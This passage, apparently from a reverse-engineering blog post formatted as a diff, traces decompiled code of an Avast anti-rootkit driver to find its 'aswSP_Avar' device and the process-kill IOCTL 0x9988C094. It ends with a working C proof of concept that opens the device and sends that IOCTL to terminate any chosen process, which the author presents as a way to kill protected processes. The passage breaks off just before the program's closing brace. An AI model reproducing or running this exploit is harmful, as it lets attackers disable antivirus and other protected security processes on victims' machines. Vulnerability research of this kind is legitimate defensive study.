+        RtlInitUnicodeString(&DestinationString, (PCWSTR)a2);
+        v35 = DestinationString.Length + 8;
+        v34[12] = DestinationString.Length + 8;
+        v34[13] = v35;
+        v36 = ExAllocatePool(PagedPool, v35);
+        *((_QWORD *)v34 + 4) = v36;
+        if ( !v36 )
+          goto LABEL_122;
+        *(_QWORD *)v36 = *(_QWORD *)L"\\??\\";
+        v36[4] = asc_140022920[4];
+        memmove((void *)(*((_QWORD *)v34 + 4) + 8i64), DestinationString.Buffer, DestinationString.Length);
+        ExAcquireFastMutex(&stru_14004D100);
+        v37 = (_QWORD *)qword_1400289D8;
+        if ( *(PVOID **)qword_1400289D8 != &qword_1400289D0 )
+          __fastfail(3u);
+        *(_QWORD *)v34 = &qword_1400289D0;
+        *((_QWORD *)v34 + 1) = v37;
+        *v37 = v34;
+        qword_1400289D8 = (__int64)v34;
+        if ( !byte_14004D082 )
+        {
+          WorkItem = IoAllocateWorkItem(qword_14004D0E0);
+          if ( !WorkItem )
+          {
+LABEL_121:
+            ExReleaseFastMutex(&stru_14004D100);
+LABEL_122:
+            if ( v34 )
+            {
+              v39 = (void *)*((_QWORD *)v34 + 4);
+              if ( v39 )
+                ExFreePoolWithTag(v39, 0);
+              ExFreePoolWithTag(v34, 0);
+            }
+            a7[1] = 0i64;
+            return *(unsigned int *)a7;
+          }
+          IoQueueWorkItem(WorkItem, sub_140018CC0, DelayedWorkQueue, WorkItem);
+          byte_14004D082 = 1;
+        }
+        v34 = 0i64;
+        goto LABEL_121;
+      case 0x9988C0CC:
+        P = 0i64;
+        if ( a3 >= 0x20 && a2 )
+        {
+          if ( *(_DWORD *)a2 <= a3 )
+          {
+            if ( *((_BYTE *)a2 + 5) != 3 || a5 >= 4 && a4 && *((_DWORD *)a2 + 5) >= a5 )
+            {
+              v40 = sub_14001BE90(a2, &P);
+              *(_DWORD *)a7 = v40;
+              if ( !v40 )
+              {
+                a7[1] = 0i64;
+                v41 = P;
+                if ( P )
+                {
+                  if ( *((_BYTE *)a2 + 5) == 3 )
+                  {
+                    memmove(v11, P, a5);
+                    a7[1] = a5;
+                  }
+                  ExFreePoolWithTag(v41, 0);
+                }
+              }
+              return *(unsigned int *)a7;
+            }
+            else
+            {
+              result = 3221225990i64;
+              *(_DWORD *)a7 = -1073741306;
+            }
+          }
+          else
+          {
+            result = 3221225990i64;
+            *(_DWORD *)a7 = -1073741306;
+          }
+        }
+        else
+        {
+          result = 3221225990i64;
+          *(_DWORD *)a7 = -1073741306;
+        }
+        return result;
+      case 0x9988C058:
+        if ( a3 != 224 || !a2 )
+          goto LABEL_194;
+        result = sub_14001C12C(a2, a8);
+LABEL_148:
+        *(_DWORD *)a7 = result;
+        a7[1] = 0i64;
+        return result;
+      case 0x9988C094:
+        if ( a3 != 4 || !a2 )
+          goto LABEL_194;
+        result = sub_14001DC80(*(_DWORD *)a2);  // here!!!!!!!!!!!!!!!!!!!!!
+        goto LABEL_148;
+      case 0x9988C098:
+        if ( a3 != 8 || !a2 )
+          goto LABEL_194;
+        result = sub_14001DE10(*(unsigned int *)a2, *((unsigned int *)a2 + 1));
+        goto LABEL_148;
+      case 0x9988C09C:
+        PROCESS = 0i64;
+        P = 0i64;
+        Process = 0i64;
+        if ( a3 < 0x28 || !a2 || a5 < 4 || !a4 )
+          goto LABEL_194;
+        v42 = *((_DWORD *)a2 + 4);
+        if ( v42 && !PsLookupProcessByProcessId((HANDLE)v42, &PROCESS) && *((_BYTE *)a2 + 12) )
+          KeStackAttachProcess(PROCESS, &ApcState);
+        v43 = 0i64;
+        v53 = 0i64;
+        if ( *(_DWORD *)a2 )
+        {
+          if ( *(_DWORD *)a2 != 1 )
+          {
+            if ( *(_DWORD *)a2 == 2 )
+            {
+              if ( !PsLookupThreadByThreadId((HANDLE)*((unsigned int *)a2 + 5), (PETHREAD *)&P) )
+              {
+                if ( !ObOpenObjectByPointer(P, 0x200u, 0i64, 0, (POBJECT_TYPE)PsThreadType, 0, &Handle) )
+                {
+                  LODWORD(MaxCount) = *((_DWORD *)a2 + 2);
+                  v43 = (void *)sub_14001C864(*(unsigned int *)a2, *((unsigned int *)a2 + 1), &MaxCount, Handle);
+                  v53 = v43;
+                  ZwClose(Handle);
+                  v13 = MaxCount;
+                }
+                ObfDereferenceObject(P);
+              }
+            }
+            else if ( *(_DWORD *)a2 == 3
+                   && qword_14004CAF0
+                   && !(unsigned int)sub_140020744(a2, PROCESS, sub_140018BD0, &Process) )
+            {
+              v43 = (void *)*((_QWORD *)Process + 9);
+              v53 = v43;
+              v13 = *((_DWORD *)a2 + 2);
+              LODWORD(MaxCount) = v13;
+              ExFreePoolWithTag(Process, 0);
+            }
+            goto LABEL_182;
+          }
+          if ( !PROCESS || ObOpenObjectByPointer(PROCESS, 0x200u, 0i64, 0, (POBJECT_TYPE)PsProcessType, 0, &Handle) )
+          {
+LABEL_182:
+            if ( *((_DWORD *)a2 + 4) && PROCESS )
+            {
+              if ( *((_BYTE *)a2 + 12) )
+                KeUnstackDetachProcess(&ApcState);
+              ObfDereferenceObject(PROCESS);
+            }
+            if ( v43 )
+            {
+              if ( v13 <= a5 )
+              {
+                memmove(v11, v43, v13);
+                a7[1] = v13;
+                *(_DWORD *)a7 = 0;
+                ExFreePoolWithTag(v43, 0);
+                return *(unsigned int *)a7;
+              }
+              if ( a5 == 4 )
+              {
+                *(_DWORD *)v11 = v13;
+                a7[1] = 4i64;
+                *(_DWORD *)a7 = 0;
+                ExFreePoolWithTag(v43, 0);
+                return *(unsigned int *)a7;
+              }
+              ExFreePoolWithTag(v43, 0);
+            }
+            *(_DWORD *)a7 = -1073741306;
+            return *(unsigned int *)a7;
+          }
+          LODWORD(MaxCount) = *((_DWORD *)a2 + 2);
+          v43 = (void *)sub_14001C864(*(unsigned int *)a2, *((unsigned int *)a2 + 1), &MaxCount, Handle);
+          v53 = v43;
+          ZwClose(Handle);
+        }
+        else
+        {
+          v43 = (void *)sub_14001C9FC(*((unsigned int *)a2 + 1), &MaxCount);
+          v53 = v43;
+        }
+        v13 = MaxCount;
+        goto LABEL_182;
+      case 0x9988C404:
+        if ( a2 && a3 >= 5 && a4 && a5 >= 4 )
+        {
+          HandleInformation = (POBJECT_HANDLE_INFORMATION)a4;
+          LOBYTE(a4) = *((_BYTE *)a2 + 3);
+          LOBYTE(a3) = *((_BYTE *)a2 + 2);
+          LOBYTE(v12) = *((_BYTE *)a2 + 1);
+          LOBYTE(v14) = *(_BYTE *)a2;
+          v44 = sub_140018E3C(v14, v12, a3, (_DWORD)a4, *((_BYTE *)a2 + 4), (__int64)HandleInformation);
+          a7[1] = 4i64;
+LABEL_215:
+          *(_DWORD *)a7 = v44;
+          return *(unsigned int *)a7;
+        }
+        break;
+      case 0x9988C408:
+        if ( a2 )
+        {
+          if ( a3 == 12 )
+          {
+            if ( a4 )
+            {
+              if ( a5 )
+              {
+                Process = (PEPROCESS)*(unsigned int *)a2;
+                if ( *((_DWORD *)a2 + 1) == a5 )
+                {
+                  result = sub_140018F00(Process, a5, a4);
+                  *(_DWORD *)a7 = result;
+                  a7[1] = a5;
+                  return result;
+                }
+              }
+            }
+          }
+        }
+        break;
+      case 0x9988C40C:
+        if ( a2 )
+        {
+          if ( a3 == 12 )
+          {
+            Process = (PEPROCESS)*(unsigned int *)a2;
+            v45 = *((unsigned int *)a2 + 1);
+            if ( (unsigned int)v45 <= 4 )
+            {
+              result = sub_140018F7C(Process, v45, a2 + 1);
+              *(_DWORD *)a7 = result;
+              a7[1] = *((unsigned int *)a2 + 1);
+              return result;
+            }
+          }
+        }
+        break;
+      default:
+        v44 = sub_14001FF58(a1, a2, a3, a4, a5, a6, a7, a8);
+        goto LABEL_215;
+    }
+    v44 = -1073741306;
+    goto LABEL_215;
+  }
+  if ( a3 != 56 || !a2 )
+    goto LABEL_194;
+  v20 = 0i64;
+  v21 = a2 + 2;
+  a2[2] = 0i64;
+  if ( !ObReferenceObjectByHandle((HANDLE)a2[1], 0, 0i64, 0, (PVOID *)a2 + 2, 0i64) )
+  {
+    v20 = (void *)*v21;
+    *a2 = *(_QWORD *)(*v21 + 104i64);
+    ObfDereferenceObject(v20);
+  }
+  v22 = (_QWORD *)sub_14001898C(*v21);
+  if ( v22 && v20 )
+  {
+    *v22 = *a2;
+    v22[2] = *v21;
+    a7[1] = 0i64;
+    *(_DWORD *)a7 = 0;
+    return 0i64;
+  }
+  else
+  {
+    for ( i = 0; ; ++i )
+    {
+      v54 = i;
+      if ( (unsigned __int64)i >= 0xA )
+        break;
+      v24 = 56i64 * i;
+      if ( !*(_QWORD *)((char *)&unk_14004D160 + v24 + 8) )
+      {
+        *(_OWORD *)((char *)&unk_14004D160 + v24) = *(_OWORD *)a2;
+        *(_OWORD *)((char *)&unk_14004D160 + v24 + 16) = *((_OWORD *)a2 + 1);
+        *(_OWORD *)((char *)&unk_14004D160 + v24 + 32) = *((_OWORD *)a2 + 2);
+        *(_QWORD *)((char *)&unk_14004D160 + v24 + 48) = a2[6];
+        break;
+      }
+    }
+    *(_DWORD *)a7 = 0;
+    return 0i64;
+  }
+}
+```
+
+In this snippet, we can see a lot of case with 32 bits hexadecimal code… Well this looks a lot like the `IOCTL` switch case, doesn’t it? We can clearly see the value linked to our “terminate function”, is `0x9988C094`.
+
+Let’s continue our function call moonwalk and check the calling function with the cross-reference.
+
+```assembly
+__int64 __fastcall sub_140019D54(__int64 a1, IRP *a2)
+{
+  struct _IO_STACK_LOCATION *CurrentStackLocation; // rcx
+  PVOID *p_IoStatus; // r11
+  unsigned int v4; // edi
+  struct _IRP *MasterIrp; // rdx
+  _DWORD *p_Type; // r9
+  __int64 Options; // r8
+  int LowPart; // r10d
+
+  CurrentStackLocation = a2->Tail.Overlay.CurrentStackLocation;
+  p_IoStatus = (PVOID *)&a2->IoStatus;
+  v4 = 0;
+  a2->IoStatus.Information = 0i64;
+  MasterIrp = a2->AssociatedIrp.MasterIrp;
+  *(_DWORD *)p_IoStatus = 0;
+  p_Type = &MasterIrp->Type;
+  Options = CurrentStackLocation->Parameters.Create.Options;
+  LowPart = CurrentStackLocation->Parameters.Read.ByteOffset.LowPart;
+  if ( CurrentStackLocation->MajorFunction == 2 )
+  {
+    sub_140019E00(CurrentStackLocation, MasterIrp, Options, MasterIrp);
+    sub_140017F98(&dword_14004D460);
+  }
+  else if ( CurrentStackLocation->MajorFunction == 14 )
+  {
+    if ( (LowPart & 3) == 3 )   // If IOCTL uses METHOD_NEITHER
+      p_Type = a2->UserBuffer;
+    v4 = sub_140018FF8(
+           (__int64)CurrentStackLocation->FileObject,
+           MasterIrp,
+           Options,
+           p_Type,
+           CurrentStackLocation->Parameters.Read.Length,
+           LowPart,  //  !!!!!!!!!!!!!!!!!
+           p_IoStatus,
+           a1);
+  }
+  IofCompleteRequest(a2, 0);
+  return v4;
+}
+```
+
+Now, we see the `CurrentStackLocation` being retrieved, the `SystemBuffer` which is one of the buffer that can be used to store user-input data, the `IoControlCode` and the `MajorFunction` value being checked.
+
+The decimal value for the major function code `IRP_MJ_DEVICE_CONTROL` is 14 (or 0x0e) and 2 for `IRP_MJ_CLOSE`. You can [check it here](https://github.com/tpn/winsdk-10/blob/9b69fd26ac0c7d0b83d378dba01080e93349c2ed/Include/10.0.14393.0/km/wdm.h#L26607) or on your machine if you have the WDK installed.
+
+So basically: a check is performed on the major function code to behave differently depending on whether `IRP_MJ_CLOSE` or `IRP_MJ_DEVICE_CONTROL` is received.
+
+Our path of interest to the terminate code requires major function code `IRP_MJ_DEVICE_CONTROL`. The required arguments have `IOCTL` and input buffer, which is logical.
+
+The **IoGetRequestorProcessId** routine returns the unique 32-bit process ID for the thread that originally requested a given I/O operation.
+
+```assembly
+ULONG IoGetRequestorProcessId(
+  [in] PIRP Irp
+);
+```
+
+* [in] Irp
+
+A pointer to the I/O request packet (IRP) for the specified I/O operation.
+
+```assembly
+NTSTATUS __fastcall sub_140014890(struct _DEVICE_OBJECT *a1, IRP *a2)
+{
+  __int64 v2; // r14
+  int v3; // esi
+  __int64 v5; // rbx
+  struct _IO_STACK_LOCATION *CurrentStackLocation; // r15
+  struct _IO_STACK_LOCATION *v7; // rax
+  struct _DEVICE_OBJECT **DeviceExtension; // rbx
+  struct _DEVICE_OBJECT *v9; // rcx
+  unsigned int *v10; // rbx
+  int v11; // eax
+  __int64 v13; // rax
+  __int64 MasterIrp; // rbx
+  HANDLE CurrentProcessId; // rax
+  struct _IO_STACK_LOCATION *v16; // rax
+  struct _DEVICE_OBJECT **v17; // rsi
+  ULONG RequestorProcessId; // eax
+  struct _IO_STACK_LOCATION *v19; // rax
+  IO_STATUS_BLOCK *p_IoStatus; // r14
+  struct _IRP *v21; // rdx
+  PVOID UserBuffer; // r9
+  __int64 v23; // r8
+  DWORD LowPart; // r10d
+  ULONG v25; // eax
+  int v26; // [rsp+48h] [rbp-39h] BYREF
+  struct _UNICODE_STRING DestinationString; // [rsp+50h] [rbp-31h] BYREF
+  __int128 v28; // [rsp+60h] [rbp-21h]
+  int v29; // [rsp+70h] [rbp-11h] BYREF
+  HANDLE v30; // [rsp+74h] [rbp-Dh]
+  __int64 v31; // [rsp+7Ch] [rbp-5h]
+  __int64 v32; // [rsp+84h] [rbp+3h]
+  struct _UNICODE_STRING *p_DestinationString; // [rsp+8Ch] [rbp+Bh]
+  int v34; // [rsp+94h] [rbp+13h]
+  int *v35; // [rsp+98h] [rbp+17h]
+  ULONG Options; // [rsp+A0h] [rbp+1Fh]
+  __int64 v37; // [rsp+A4h] [rbp+23h]
+
+  v2 = qword_1400292A8;
+  v3 = 0;
+  v5 = (__int64)a1;
+  if ( qword_1400292A8 )
+  {
+    CurrentStackLocation = a2->Tail.Overlay.CurrentStackLocation;
+    while ( *(struct _DEVICE_OBJECT **)(v2 + 8) != a1 )
+    {
+      v2 = *(_QWORD *)(v2 + 120);
+      if ( !v2 )
+        goto LABEL_5;
+    }
+    v10 = (unsigned int *)(v2 + 128);
+    if ( CurrentStackLocation->MajorFunction == 14 )
+    {
+      v11 = *v10;
+      if ( *v10 )
+      {
+        while ( CurrentStackLocation->Parameters.Read.ByteOffset.LowPart != v11 )
+        {
+          v11 = *++v10;
+          if ( !*v10 )
+            goto LABEL_14;
+        }
+        v26 = 0;
+        DestinationString = 0i64;
+        v28 = 0i64;
+        RtlInitUnicodeString(&DestinationString, (PCWSTR)(v2 + 16));
+        v13 = *v10;
+        MasterIrp = (__int64)a2->AssociatedIrp.MasterIrp;
+        *((_QWORD *)&v28 + 1) = v13;
+        CurrentProcessId = PsGetCurrentProcessId();
+        v37 = 0i64;
+        v30 = CurrentProcessId;
+        p_DestinationString = &DestinationString;
+        v35 = &v26;
+        v29 = 11;
+        v31 = 0i64;
+        v32 = MasterIrp;
+        v34 = 2;
+        Options = CurrentStackLocation->Parameters.Create.Options;
+        sub_1400086D8(&v29);
+        if ( (v26 & 3) != 0 )
+          goto LABEL_17;
+      }
+    }
+LABEL_14:
+    ++a2->CurrentLocation;
+    ++a2->Tail.Overlay.CurrentStackLocation;
+    v9 = *(struct _DEVICE_OBJECT **)v2;
+    return IofCallDriver(v9, a2);
+  }
+LABEL_5:
+  if ( qword_14004C860 && a1 == (struct _DEVICE_OBJECT *)qword_14004C860 ) // Avar_Device
+  {
+    v7 = a2->Tail.Overlay.CurrentStackLocation;  // 😄
+    DeviceExtension = (struct _DEVICE_OBJECT **)a1->DeviceExtension;
+    if ( v7->MajorFunction == 2 )
+    {
+      sub_14000FB84(a1, v7->FileObject, 255i64);
+      v7 = a2->Tail.Overlay.CurrentStackLocation;  // 😄
+    }
+    ++a2->CurrentLocation;
+    a2->Tail.Overlay.CurrentStackLocation = v7 + 1;  // 😄
+    v9 = *DeviceExtension;
+    return IofCallDriver(v9, a2);
+  }
+  if ( qword_140029DE8 && a1 == qword_140029DE8 )
+  {
+    v16 = a2->Tail.Overlay.CurrentStackLocation;
+    v17 = (struct _DEVICE_OBJECT **)a1->DeviceExtension;
+    if ( v16->MajorFunction == 4 )
+    {
+      sub_14000EFB0(a1, a2);
+      v16 = a2->Tail.Overlay.CurrentStackLocation;
+    }
+    ++a2->CurrentLocation;
+    a2->Tail.Overlay.CurrentStackLocation = v16 + 1;
+    v9 = *v17;
+    return IofCallDriver(v9, a2);
+  }
+  if ( qword_14004D9B8 && a1 == (struct _DEVICE_OBJECT *)qword_14004D9B8 )
+  {
+    if ( a2->RequestorMode )
+    {
+      if ( !a2->Tail.Overlay.CurrentStackLocation->MajorFunction )
+      {
+        if ( qword_14004DA38 )
+        {
+          RequestorProcessId = IoGetRequestorProcessId(a2);  // 😄
+          if ( !(unsigned __int8)((__int64 (__fastcall *)(_QWORD))qword_14004DA38)(RequestorProcessId) )
+          {
+LABEL_17:
+            a2->IoStatus.Status = -1073741637;
+            IofCompleteRequest(a2, 0);
+            return -1073741637;
+          }
+        }
+      }
+    }
+    return sub_140019D54(v5, a2); // here!!!!!!!!!!!!!!!!!!!!!!!!
+  }
+  else
+  {
+  	v19 = a2->Tail.Overlay.CurrentStackLocation;
+    p_IoStatus = &a2->IoStatus;
+    v21 = a2->AssociatedIrp.MasterIrp;
+    a2->IoStatus.Status = 0;
+    LODWORD(UserBuffer) = (_DWORD)v21;
+    a2->IoStatus.Information = 0i64;
+    LOBYTE(a1) = v19->MajorFunction;
+    v23 = v19->Parameters.Create.Options;
+    LowPart = v19->Parameters.Read.ByteOffset.LowPart;
+    if ( v19->MajorFunction )
+    {
+      if ( (_BYTE)a1 == 2 )
+      {
+        sub_1400126DC(a1, v21, v23, v21);
+      }
+      else if ( (_BYTE)a1 == 14 )
+      {
+        if ( (LowPart & 3) == 3 )
+          UserBuffer = a2->UserBuffer;
+        v3 = sub_14001469C(
+               (_DWORD)a1,
+               (_DWORD)v21,
+               v23,
+               (_DWORD)UserBuffer,
+               v19->Parameters.Read.Length,
+               LowPart,
+               (__int64)&a2->IoStatus);
+      }
+    }
+    else if ( a2->RequestorMode )
+    {
+      if ( qword_14004DA38 )
+      {
+        v25 = IoGetRequestorProcessId(a2);
+        if ( !(unsigned __int8)((__int64 (__fastcall *)(_QWORD))qword_14004DA38)(v25) )
+        {
+          p_IoStatus->Status = -1073741637;
+          v3 = -1073741637;
+        }
+      }
+    }
+    IofCompleteRequest(a2, 0);
+    return v3;
+  }
+}
+```
+
+Here there’s not much to see, but the first line is of interest. The device object is checked in the `if` statement. But why a device would need to be checked?
+
+If we go a little bit further in the code we have an `else` statement following a similar function (I know it’s similar because I checked it already be we are not going to do it again here).
+
+We walk back the calling flow one more time.
+
+```assembly
+__int64 __fastcall sub_140014B60(struct _DRIVER_OBJECT *a1)
+{
+  const wchar_t *v2; // rdi
+  __int64 result; // rax
+  NTSTATUS v4; // edi
+  struct _UNICODE_STRING DestinationString; // [rsp+50h] [rbp-28h] BYREF
+  struct _UNICODE_STRING SymbolicLinkName; // [rsp+60h] [rbp-18h] BYREF
+
+  DriverObject = a1;
+  v2 = L"aswSP_ArPot2";
+  if ( !byte_14004D9F4 )
+    v2 = L"avgSP_ArPot2";
+  _snwprintf(word_1400293A0, 0x1Eui64, L"\\Device\\%s", v2);
+  _snwprintf(word_14002C0E0, 0x1Eui64, L"\\DosDevices\\%s", v2);
+  RtlInitUnicodeString(&DestinationString, word_1400293A0);
+  RtlInitUnicodeString(&SymbolicLinkName, word_14002C0E0);
+  result = sub_140050090(                       // CreateDevice
+             (_DWORD)a1,                        // DriverObject
+             0,                                 // DeviceExtensionSize
+             (unsigned int)&DestinationString,  // DeviceName
+             0x7299,                            // DeviceType
+             0x100,                             // DeviceCharacteristics
+             1,                                 // Exclusize
+             (__int64)L"68",                    // DefaultSSDLString
+             0i64,                              // DeviceGlassGuid
+             (__int64)&DeviceObject);           // DeviceObject
+  if ( (int)result >= 0 )
+  {
+    v4 = IoCreateSymbolicLink(&SymbolicLinkName, &DestinationString);
+    if ( v4 >= 0 )
+    {
+      memset64(a1->MajorFunction, (unsigned __int64)sub_140014890, 0x1Cui64);
+      return 0i64;
+    }
+    else
+    {
+      IoDeleteDevice(DeviceObject);
+      return (unsigned int)v4;
+    }
+  }
+  return result;
+}
+```
+
+In this function 2 strings are available: `aswSP_ArPot2` and `avgSP_ArPot2`. One of those strings will be selected to create the device and symbolic link name.
+
+We won’t see here the code in charge of thE selection but, basically, the value in the `if` statement is a flag set according to the driver’s name in the registry key pointed by the `RegistryPath` of the `DriverEntry`.
+
+If the driver name starts with `asw` then `aswSP_ArPot2` will be used. Otherwise, if it starts with `avg` it will be `avgSP_ArPot2`.
+
+Finally, if the driver name doesn’t start with any of those, an error will be triggered.
+
+Let’s get back to rest of this code.
+
+We have a `CreateDevice()` and an `IoCreateSymbolicLink()` function. We saw why it’s used earlier in the `DriverEntry` chapter.
+
+The interesting thing here is the `memset64()` function after the `IoCreateSymbolicLink()`.
+
+If the symbolic link is successfully created, then `Major_Dispatch_function()` (where we come from) address is set the in the `MajorFunction` attribute of the driver object.
+
+In this code one unique function dispatches all the `IRPs`.
+
+However, In our `DriverEntry()` example we used a more common approach by using differents functions to handle specific `IRPs`.
+
+```assembly
+// CreateCloseFunction() is used to handle IRP_MJ_CREATE and IRP_MJ_CLOSE
+
+    // When Nt/ZwCreatefile() is used on this driver the function 'CreateCloseFunction' will be executed.
+    DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateCloseFunction;
+
+    // When Nt/ZwClose() is used on this driver the function 'CreateCloseFunction' will be executed.
+    DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateCloseFunction;
+
+// IOCTL_DispatchFunction() is used to handle IRP_MJ_DEVICE_CONTROL 
+
+    // When a Nt/ZwNtDeviceIoControlFile() is used on this driver the function 'IOCTL_DispatchFunction' will be executed.
+    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IOCTL_DispatchFunction;
+```
+
+Now, we moonwalk again.
+
+```assembly
+__int64 __fastcall sub_1400163F0(struct _DRIVER_OBJECT *a1, __int64 a2)
+{
+  ULONG MajorVersion; // [rsp+28h] [rbp-E0h] BYREF
+  ULONG MinorVersion[3]; // [rsp+2Ch] [rbp-DCh] BYREF
+  struct _OSVERSIONINFOW VersionInformation; // [rsp+38h] [rbp-D0h] BYREF
+
+  PsGetVersion(&MajorVersion, MinorVersion, &BuildNumber, 0i64);
+  dword_14002A224 = MinorVersion[0] | (MajorVersion << 8);
+  if ( (unsigned int)dword_14002A224 < 0x501 )
+    return 3221225473i64;
+  strcpy((char *)&dword_14002A320, "210129");
+  VersionInformation.dwOSVersionInfoSize = 276;
+  if ( RtlGetVersion(&VersionInformation) >= 0
+    && (VersionInformation.dwMajorVersion > 6
+     || VersionInformation.dwMajorVersion == 6 && VersionInformation.dwMinorVersion >= 2) )
+  {
+    PoolType = 512;
+    dword_1400289B8 = 0x40000000;
+  }
+  sub_140020D54(a2);
+  sub_140020E40(a2);
+  sub_14001A0A8(a1);  // Device_Avar()
+  sub_140015D98();
+  if ( !(unsigned int)sub_140014B60(a1) )
+    sub_140021248();
+  return 0i64;
+}
+```
+
+We see 2 functions using the driver object `a1` as an argument. We come from `Device_Arpot2()`, so let’s check this `Device_Avar()`.
+
+```assembly
+__int64 __fastcall sub_14001A0A8(int a1)
+{
+  __int64 result; // rax
+  const wchar_t *v3; // r9
+  __int64 v4; // rcx
+  WCHAR v5; // ax
+  __int64 v6; // rcx
+  WCHAR v7; // ax
+  __int64 v8; // rcx
+  WCHAR v9; // ax
+  __int64 v10; // rcx
+  char v11; // al
+  ULONG MajorVersion; // [rsp+58h] [rbp-89h] BYREF
+  ULONG MinorVersion; // [rsp+5Ch] [rbp-85h] BYREF
+  struct _UNICODE_STRING DestinationString; // [rsp+60h] [rbp-81h] BYREF
+  struct _UNICODE_STRING SymbolicLinkName; // [rsp+70h] [rbp-71h] BYREF
+  char v16[16]; // [rsp+80h] [rbp-61h] BYREF
+  int v17[6]; // [rsp+90h] [rbp-51h]
+  __int16 v18; // [rsp+A8h] [rbp-39h]
+  int v19[8]; // [rsp+B0h] [rbp-31h]
+  __int16 v20; // [rsp+D0h] [rbp-11h]
+  int v21[9]; // [rsp+D8h] [rbp-9h]
+  __int16 v22; // [rsp+FCh] [rbp+1Bh]
+
+  qword_14004D9B8 = 0i64;
+  PsGetVersion(&MajorVersion, &MinorVersion, &dword_14004D394, 0i64);
+  dword_14004D448 = MinorVersion | (MajorVersion << 8);
+  if ( (unsigned int)dword_14004D448 < 0x500 )
+    return 3221225473i64;
+  v3 = L"aswSP_Avar";
+  if ( !byte_14004D9F4 )
+    v3 = L"avgSP_Avar";
+  qword_14004D0E8 = (__int64)v3;
+  _snwprintf(&word_14004D400, 0x1Eui64, L"\\Device\\%s");
+  _snwprintf(word_14004D0A0, 0x1Eui64, L"\\DosDevices\\%s", qword_14004D0E8);
+  RtlInitUnicodeString(&DestinationString, &word_14004D400);
+  RtlInitUnicodeString(&SymbolicLinkName, word_14004D0A0);
+  result = sub_140050090(
+             a1,
+             0,
+             (unsigned int)&DestinationString,
+             39304,
+             256,
+             0,
+             (__int64)L"68",
+             0i64,
+             (__int64)&qword_14004D0E0);
+  dword_14004D390 = result;
+  if ( (int)result >= 0 )
+  {
+    dword_14004D390 = IoCreateSymbolicLink(&SymbolicLinkName, &DestinationString);
+    if ( dword_14004D390 >= 0 )
+    {
+      qword_14004D9B8 = (__int64)qword_14004D0E0;
+      v4 = 0i64;
+      v19[0] = 4587612;
+      v19[1] = 7077993;
+      v19[2] = 7536741;
+      v19[3] = 7536761;
+      v19[4] = 6619252;
+      v19[5] = 6029421;
+      v19[6] = 7602254;
+      v19[7] = 7536742;
+      v20 = 0;
+      v17[0] = 4456540;
+      v17[1] = 6881394;
+      v17[2] = 6619254;
+      v17[3] = 6029426;
+      v17[4] = 6881348;
+      v17[5] = 7012467;
+      v18 = 0;
+      v21[0] = 7274569;
+      v21[1] = 4391014;
+      v21[2] = 7143535;
+      v21[3] = 7078000;
+      v21[4] = 7602277;
+      v21[5] = 5374053;
+      v21[6] = 7405669;
+      v21[7] = 6619253;
+      v21[8] = 7602291;
+      v22 = 0;
+      strcpy(v16, "CLASSPNP.SYS");
+      do
+      {
+        v5 = *(_WORD *)((char *)v19 + v4);
+        *(WCHAR *)((char *)&word_14004D060 + v4) = v5;
+        v4 += 2i64;
+      }
+      while ( v5 );
+      v6 = 0i64;
+      do
+      {
+        v7 = *(_WORD *)((char *)v17 + v6);
+        *(WCHAR *)((char *)&word_14004D140 + v6) = v7;
+        v6 += 2i64;
+      }
+      while ( v7 );
+      v8 = 0i64;
+      do
+      {
+        v9 = *(_WORD *)((char *)v21 + v8);
+        *(WCHAR *)((char *)&word_14004D3C0 + v8) = v9;
+        v8 += 2i64;
+      }
+      while ( v9 );
+      v10 = 0i64;
+      do
+      {
+        v11 = v16[v10];
+        byte_14004D3A0[v10++] = v11;
+      }
+      while ( v11 );
+      stru_14004D100.Count = 1;
+      qword_1400289D8 = (__int64)&qword_1400289D0;
+      qword_1400289D0 = &qword_1400289D0;
+      stru_14004D100.Owner = 0i64;
+      stru_14004D100.Contention = 0;
+      KeInitializeEvent(&stru_14004D100.Event, SynchronizationEvent, 0);
+      sub_140019F54();
+      sub_14001C3D0();
+      qword_14004CF60 = sub_14001CA98(L"IoCreateFileSpecifyDeviceObjectHint");
+      qword_14004CD80 = sub_14001CA98(L"IofCallDriver");
+      sub_14001CA98(L"IofCompleteRequest");
+      sub_14001A4EC();
+      sub_14001FEC4();
+      return 0i64;
+    }
+    else
+    {
+      IoDeleteDevice(qword_14004D0E0);
+      return (unsigned int)dword_14004D390;
+    }
+  }
+  return result;
+}
+```
+
+It looks pretty much like our `Device_Arpot2()` code. But unlike `Device_Arpot2()`, we don’t see any manipulation of the drivers object attribute `MajorFunction`.
+
+However, we see that the `Avar_Device` variable is set with the newly created `Avar` device object.
+
+This means that at least 2 devices will be available for this driver after load (`Arpot2` and `Avar`).
+
+This solves our mystery on the device object check that we saw here:
+
+The purpose of this check is to dispatch the `IRPs` to the appropriate device.
+
+Now, we have all the information, we need!
+
+- the device in charge of our process termination function is the `Avar` one;
+- the IOCTL is `0x9988C094`;
+- our vulnerable **driver** name is `**asw**ArPot`, this means that the device name will be `**asw**SP_Avar`.
+
+ retrieve an handle on the appropriate device :
+
+```assembly
+CreateFileA("\\\\.\\aswSP_Avar", GENERIC_WRITE|GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+```
+
+And send the kill IOCTL with the PID of our target using `DeviceIoControl`
+
+```assembly
+DeviceIoControl(hDevice, 0x9988c094, &pid, sizeof(pid), NULL, 0, &lpBytesReturned, NULL);
+```
+
+**VOILA**, you now have a PoC that allows you to kill any protected process using a vulnerable driver. EASY PEASY!
+
+```assembly
+#include <stdio.h>
+#include <windows.h>
+
+#define IOCTL_KILL_PROCESS 0x9988c094
+
+int main(void) {
+
+	unsigned int pid;
+	unsigned int res;
+	DWORD lpBytesReturned = 0;
+	
+	HANDLE hDevice = CreateFileA("\\\\.\\aswSP_Avar", GENERIC_WRITE|GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	
+	if(hDevice == INVALID_HANDLE_VALUE){
+		printf("Connection to the driver failed\n");
+		return -1;
+	}
+	
+	printf("Connected to the Avast anti-rootkit driver");
+	printf("PID please : \n");
+	scanf("%u", &pid);
+
+	res = DeviceIoControl(hDevice, IOCTL_KILL_PROCESS, &pid, sizeof(pid), NULL, 0, &lpBytesReturned, NULL);
+
+	if (!res) {
+		printf("Killing IOCTL failed\n");
+    	CloseHandle(hDevice);
+    	return -1;
+	}
+         
+	printf("Process with PID : %u killed\n", pid);
+	CloseHandle(hDevice);
+         
+	return 0;
